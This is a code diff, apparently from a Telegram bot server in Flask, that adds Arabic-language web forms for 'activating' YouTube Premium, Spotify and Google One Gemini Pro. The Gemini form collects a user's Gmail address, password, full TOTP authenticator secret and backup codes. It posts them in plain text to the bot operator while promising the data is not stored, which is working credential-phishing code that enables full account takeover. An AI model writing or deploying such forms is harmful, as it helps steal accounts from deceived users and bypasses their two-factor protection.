-            <div class="footer-note">يتم استخدام المعلومات فقط لهذا التنشيط ولا يتم حفظها.</div>
-        </div>
-        
-        <script>
-            let tg = window.Telegram.WebApp;
-            tg.expand();
-            
-            const urlParams = new URLSearchParams(window.location.search);
-            const uid = urlParams.get('uid');
-            const msg_id = urlParams.get('msg_id');
-            const points = urlParams.get('pts');
-            if(points) { document.getElementById('userPoints').innerText = points; }
-            
-            function togglePwd() {
-                let pwd = document.getElementById("password");
-                pwd.type = pwd.type === "password" ? "text" : "password";
-            }
-            
-            function clearError(id) {
-                document.getElementById(id).classList.remove('input-error');
-                let err = document.getElementById(id + '-error');
-                if(err) err.style.display = 'none';
-            }
-
-            function showError(id, msg) {
-                let el = document.getElementById(id);
-                el.classList.add('input-error');
-                let errEl = document.getElementById(id + '-error');
-                errEl.innerText = msg; errEl.style.display = 'block';
-                setTimeout(() => el.classList.remove('input-error'), 400);
-            }
-            
-            function sendData() {
-                let email = document.getElementById('email').value.trim();
-                let pwd = document.getElementById('password').value;
-                let totpRaw = document.getElementById('totp').value.trim();
-                let backup = document.getElementById('backup').value.trim();
-                
-                let isValid = true;
-                const hasArabic = (str) => /[\u0600-\u06FF]/.test(str);
-                
-                if(!email.endsWith("@gmail.com") || hasArabic(email)) {
-                    showError('email', "⚠️ يجب أن ينتهي بـ @gmail.com وبدون حروف عربية");
-                    isValid = false;
-                }
-                
-                if(!pwd || hasArabic(pwd)) {
-                    showError('password', "⚠️ يرجى إدخال كلمة المرور (بدون حروف عربية)");
-                    isValid = false;
-                }
-                
-                let totpClean = totpRaw.replace(/\s/g, ''); 
-                if(totpClean.length !== 32 || !/^[a-zA-Z0-9]+$/.test(totpClean) || hasArabic(totpRaw)) {
-                    showError('totp', "⚠️ الرمز يجب أن يكون 32 حرفاً ورقماً (يُسمح بالمسافات وبدون حروف عربية)");
-                    isValid = false;
-                }
-                
-                if(backup) {
-                    if(hasArabic(backup)) {
-                        showError('backup', "⚠️ رموز النسخ الاحتياطي يجب أن تكون أرقاماً فقط");
-                        isValid = false;
-                    } else {
-                        let codes = backup.split(/\s+/);
-                        for(let code of codes) {
-                            if(!/^\d{8}$/.test(code) && code !== "") {
-                                showError('backup', "⚠️ كل رمز احتياطي يجب أن يتكون من 8 أرقام بالضبط");
-                                isValid = false;
-                                break;
-                            }
-                        }
-                    }
-                }
-                
-                if(!isValid) return;
-                
-                document.getElementById('submitBtn').disabled = true;
-                document.getElementById('submitBtn').innerHTML = "Automatic activation";
-
-                let dataString = "الخدمة: جيميناي برو (أتمتة الباقات)\\n" + 
-                                 "الإيميل: " + email + "\\n" +
-                                 "كلمة المرور: " + pwd + "\\n" +
-                                 "TOTP: " + totpRaw + "\\n" +
-                                 "رموز الاحتياط: " + backup;
-                
-                fetch('/submit_form', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({uid: uid, msg_id: msg_id, service: 'gemini', dataString: dataString})
-                }).then(() => tg.close()).catch(() => {
-                    alert("حدث خطأ أثناء الإرسال.");
-                    document.getElementById('submitBtn').disabled = false;
-                    document.getElementById('submitBtn').innerHTML = "تأكيد وتفعيل ⚡";
-                });
-            }
-        </script>
-    </body>
-    </html>
-    '''
 
 # ==========================================
 # --- نظام API لاستقبال بيانات النماذج ---
@@ -1050,6 +982,21 @@ def submit_form():
         bot.send_message(user_id, f"🎉 <b>طلبك قيد التنفيذ، الرجاء الانتظار!</b>\n\n⭐ <b>رصيدك المتبقي:</b> {new_points} نقطة.\n\n<a href='https://t.me/bdallhshay7'>💬 للتواصل والاستفسار اضغط هنا</a>")
         return jsonify({"status": "success"}), 200
     return jsonify({"status": "error"}), 400
+
+# ==========================================
+# --- أكواد ونماذج HTML المدمجة بالسيرفر ---
+# ==========================================
+@app.route('/youtube.html')
+def youtube_form():
+    return '''<!DOCTYPE html><html dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><script src="https://telegram.org/js/telegram-web-app.js"></script><style>body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; text-align: center; padding: 20px; color: #333; margin: 0; }.card { background: white; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 20px; }h2 { color: #333; margin-top: 0; display: flex; align-items: center; justify-content: center; gap: 8px;}p { color: #666; font-size: 15px; margin-bottom: 25px; }input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }input:focus { border-color: #FF0000; outline: none; }button { background-color: #FF0000; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(255,0,0,0.2); margin-top: 10px; }button:disabled { background-color: #ccc; cursor: not-allowed; }@keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 50% {transform: translateX(5px);} 75% {transform: translateX(-5px);} }.input-error { border-color: #FF0000 !important; background-color: #ffe6e6 !important; animation: shake 0.4s; }.error-msg { color: #FF0000; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: none; text-align: right; }</style></head><body><div class="card"><h2>يوتيوب بريميوم 📺</h2><p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p><input type="url" id="link" placeholder="https://offers.sheerid.com/..." oninput="clearError('link')"><div id="link-error" class="error-msg"></div><button id="submitBtn" onclick="sendData()">تأكيد وطلب التفعيل</button></div><script>let tg = window.Telegram.WebApp;tg.expand();const urlParams = new URLSearchParams(window.location.search);const uid = urlParams.get('uid'); const msg_id = urlParams.get('msg_id');function clearError(id) {document.getElementById(id).classList.remove('input-error');document.getElementById(id + '-error').style.display = 'none';}function showError(id, msg) {let el = document.getElementById(id);el.classList.add('input-error');let errEl = document.getElementById(id + '-error');errEl.innerText = msg; errEl.style.display = 'block';setTimeout(() => el.classList.remove('input-error'), 400);}function sendData() {let link = document.getElementById('link').value.trim();let hasArabic = /[\u0600-\u06FF]/.test(link);if(!link.startsWith("https://offers.sheerid.com/") || hasArabic) { let msg = hasArabic ? "⚠️ عذراً، لا يُسمح باستخدام الحروف العربية" : "⚠️ عذراً، يجب أن يبدأ الرابط بـ https://offers.sheerid.com/";showError('link', msg); return; }document.getElementById('submitBtn').disabled = true;document.getElementById('submitBtn').innerText = "جاري الإرسال...";fetch('/submit_form', {method: 'POST', headers: {'Content-Type': 'application/json'},body: JSON.stringify({uid: uid, msg_id: msg_id, service: 'youtube', dataString: "الخدمة: يوتيوب بريميوم \\nالرابط: " + link})}).then(() => tg.close()).catch(() => {alert("حدث خطأ أثناء الإرسال.");document.getElementById('submitBtn').disabled = false;document.getElementById('submitBtn').innerText = "تأكيد وطلب التفعيل";});}</script></body></html>'''
+
+@app.route('/spotify.html')
+def spotify_form():
+    return '''<!DOCTYPE html><html dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><script src="https://telegram.org/js/telegram-web-app.js"></script><style>body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; text-align: center; padding: 20px; color: #333; margin: 0; }.card { background: white; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 20px; }h2 { color: #333; margin-top: 0; display: flex; align-items: center; justify-content: center; gap: 8px;}p { color: #666; font-size: 15px; margin-bottom: 25px; }input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }input:focus { border-color: #1DB954; outline: none; }button { background-color: #1DB954; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(29,185,84,0.2); margin-top: 10px;}button:disabled { background-color: #ccc; cursor: not-allowed; }@keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 50% {transform: translateX(5px);} 75% {transform: translateX(-5px);} }.input-error { border-color: #FF0000 !important; background-color: #ffe6e6 !important; animation: shake 0.4s; }.error-msg { color: #FF0000; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: none; text-align: right; }</style></head><body><div class="card"><h2>سبوتيفاي بريميوم 🎵</h2><p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p><input type="url" id="link" placeholder="https://offers.sheerid.com/..." oninput="clearError('link')"><div id="link-error" class="error-msg"></div><button id="submitBtn" onclick="sendData()">تأكيد وطلب التفعيل</button></div><script>let tg = window.Telegram.WebApp;tg.expand();const urlParams = new URLSearchParams(window.location.search);const uid = urlParams.get('uid'); const msg_id = urlParams.get('msg_id');function clearError(id) {document.getElementById(id).classList.remove('input-error');document.getElementById(id + '-error').style.display = 'none';}function showError(id, msg) {let el = document.getElementById(id);el.classList.add('input-error');let errEl = document.getElementById(id + '-error');errEl.innerText = msg; errEl.style.display = 'block';setTimeout(() => el.classList.remove('input-error'), 400);}function sendData() {let link = document.getElementById('link').value.trim();let hasArabic = /[\u0600-\u06FF]/.test(link);if(!link.startsWith("https://offers.sheerid.com/") || hasArabic) { let msg = hasArabic ? "⚠️ عذراً، لا يُسمح باستخدام الحروف العربية" : "⚠️ عذراً، يجب أن يبدأ الرابط بـ https://offers.sheerid.com/";showError('link', msg); return; }document.getElementById('submitBtn').disabled = true;document.getElementById('submitBtn').innerText = "جاري الإرسال...";fetch('/submit_form', {method: 'POST', headers: {'Content-Type': 'application/json'},body: JSON.stringify({uid: uid, msg_id: msg_id, service: 'spotify', dataString: "الخدمة: سبوتيفاي بريميوم \\nالرابط: " + link})}).then(() => tg.close()).catch(() => {alert("حدث خطأ أثناء الإرسال.");document.getElementById('submitBtn').disabled = false;document.getElementById('submitBtn').innerText = "تأكيد وطلب التفعيل";});}</script></body></html>'''
+
+@app.route('/gemini.html')
+def gemini_form():
+    return '''<!DOCTYPE html><html dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><script src="https://telegram.org/js/telegram-web-app.js"></script><style>body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; color: #333; }.header { background-color: #0f9d58; color: white; padding: 25px 20px; text-align: right; border-bottom-left-radius: 15px; border-bottom-right-radius: 15px;}.header h2 { margin: 0; font-size: 26px; display: flex; align-items: center; justify-content: flex-start; gap: 10px; }.header p { margin: 5px 0 0; font-size: 15px; opacity: 0.9; }.badge { display: inline-block; background: rgba(255,255,255,0.2); padding: 5px 12px; border-radius: 15px; font-size: 13px; margin-top: 15px; }.form-container { background: white; margin: -15px 15px 20px; padding: 25px 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.08); position: relative; z-index: 1; }.form-group { margin-bottom: 22px; text-align: right; }.section-title { font-size: 14px; color: #0f9d58; margin-bottom: 15px; font-weight: bold; border-bottom: 1px solid #eee; padding-bottom: 5px;}.form-group label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 13px; color: #555; }.input-wrapper { position: relative; }input, textarea { width: 100%; padding: 14px; border: 1.5px solid #e0e0e0; border-radius: 8px; font-size: 15px; box-sizing: border-box; font-family: inherit; transition: 0.3s; background-color: #fafafa;}input:focus, textarea:focus { outline: none; border-color: #0f9d58; background-color: white;}.toggle-password { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #888; font-size: 18px;}.helper-text { font-size: 11px; color: #888; margin-top: 8px; display: block; line-height: 1.4;}.submit-btn { background-color: #0f9d58; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; display: flex; align-items: center; justify-content: center; margin-top: 10px;}.submit-btn:disabled { background-color: #ccc; cursor: not-allowed; }.footer-note { text-align: center; font-size: 11px; color: #aaa; margin-top: 20px; }@keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 50% {transform: translateX(5px);} 75% {transform: translateX(-5px);} }.input-error { border-color: #ff3333 !important; background-color: #ffe6e6 !important; animation: shake 0.4s; }.error-msg { color: #ff3333; font-size: 11.5px; font-weight: bold; margin-top: 5px; margin-bottom: 5px; display: none; }</style></head><body><div class="header"><h2>أتمتة الباقات</h2><p>لتفعيل Google One - Gemini Pro املأ المعلومات</p><div class="badge">⭐ <span id="userPoints">0</span></div></div><div class="form-container"><div class="section-title">👤 حساب جوجل</div><div class="form-group"><label>Gmail عنوان</label><input type="email" id="email" placeholder="example@gmail.com" oninput="clearError('email')"><div id="email-error" class="error-msg"></div></div><div class="form-group"><label>كلمة مرور جيميل</label><div class="input-wrapper"><input type="password" id="password" placeholder="الخاصة بك Gmail أدخل كلمة مرور" oninput="clearError('password')"><span class="toggle-password" onclick="togglePwd()">👁️</span></div><div id="password-error" class="error-msg"></div></div><div class="section-title" style="margin-top: 30px;">🔓 المصادقة الثنائية</div><div class="form-group"><label>سر المصادقة الثنائية (TOTP)</label><input type="text" id="totp" placeholder="على سبيل المثال: JBSWY3DPEHPK3PXP" oninput="clearError('totp')"><div id="totp-error" class="error-msg"></div><span class="helper-text">ℹ️ Base32 حرفًا 32 :Google Authenticator المفتاح السري من (والأرقام من 2 إلى 7 Z إلى A الحروف من) بالضبط.</span></div><div class="form-group"><label>رموز النسخ الاحتياطي <span style="color:#aaa; font-weight:normal;">(خيار)</span></label><textarea id="backup" rows="3" placeholder="سطر واحد من التعليمات البرمجية في كل سطر..." oninput="clearError('backup')"></textarea><div id="backup-error" class="error-msg"></div><span class="helper-text">ℹ️ رمز واحد في كل سطر، 2-3 رموز مطلوبة؛ يتكون كل رمز من 8 أرقام بالضبط.</span></div><button id="submitBtn" class="submit-btn" onclick="sendData()">تأكيد وتفعيل ⚡</button><div class="footer-note">يتم استخدام المعلومات فقط لهذا التنشيط ولا يتم حفظها.</div></div><script>let tg = window.Telegram.WebApp;tg.expand();const urlParams = new URLSearchParams(window.location.search);const uid = urlParams.get('uid');const msg_id = urlParams.get('msg_id');const points = urlParams.get('pts');if(points) { document.getElementById('userPoints').innerText = points; }function togglePwd() {let pwd = document.getElementById("password");pwd.type = pwd.type === "password" ? "text" : "password";}function clearError(id) {document.getElementById(id).classList.remove('input-error');let err = document.getElementById(id + '-error');if(err) err.style.display = 'none';}function showError(id, msg) {let el = document.getElementById(id);el.classList.add('input-error');let errEl = document.getElementById(id + '-error');errEl.innerText = msg; errEl.style.display = 'block';setTimeout(() => el.classList.remove('input-error'), 400);}function sendData() {let email = document.getElementById('email').value.trim();let pwd = document.getElementById('password').value;let totpRaw = document.getElementById('totp').value.trim();let backup = document.getElementById('backup').value.trim();let isValid = true;const hasArabic = (str) => /[\u0600-\u06FF]/.test(str);if(!email.endsWith("@gmail.com") || hasArabic(email)) {showError('email', "⚠️ يجب أن ينتهي بـ @gmail.com وبدون حروف عربية");isValid = false;}if(!pwd || hasArabic(pwd)) {showError('password', "⚠️ يرجى إدخال كلمة المرور (بدون حروف عربية)");isValid = false;}let totpClean = totpRaw.replace(/\s/g, ''); if(totpClean.length !== 32 || !/^[a-zA-Z0-9]+$/.test(totpClean) || hasArabic(totpRaw)) {showError('totp', "⚠️ الرمز يجب أن يكون 32 حرفاً ورقماً (يُسمح بالمسافات وبدون حروف عربية)");isValid = false;}if(backup) {if(hasArabic(backup)) {showError('backup', "⚠️ رموز النسخ الاحتياطي يجب أن تكون أرقاماً فقط");isValid = false;} else {let codes = backup.split(/\s+/);for(let code of codes) {if(!/^\d{8}$/.test(code) && code !== "") {showError('backup', "⚠️ كل رمز احتياطي يجب أن يتكون من 8 أرقام بالضبط");isValid = false;break;}}}}if(!isValid) return;document.getElementById('submitBtn').disabled = true;document.getElementById('submitBtn').innerHTML = "جاري الإرسال... ⏳";let dataString = "الخدمة: جيميناي برو (أتمتة الباقات)\\n" + "الإيميل: " + email + "\\n" + "كلمة المرور: " + pwd + "\\n" + "TOTP: " + totpRaw + "\\n" + "رموز الاحتياط: " + backup;fetch('/submit_form', {method: 'POST', headers: {'Content-Type': 'application/json'},body: JSON.stringify({uid: uid, msg_id: msg_id, service: 'gemini', dataString: dataString})}).then(() => tg.close()).catch(() => {alert("حدث خطأ أثناء الإرسال.");document.getElementById('submitBtn').disabled = false;document.getElementById('submitBtn').innerHTML = "تأكيد وتفعيل ⚡";});}</script></body></html>'''
 
 @app.route('/' + BOT_TOKEN, methods=['POST'])
 def getMessage():
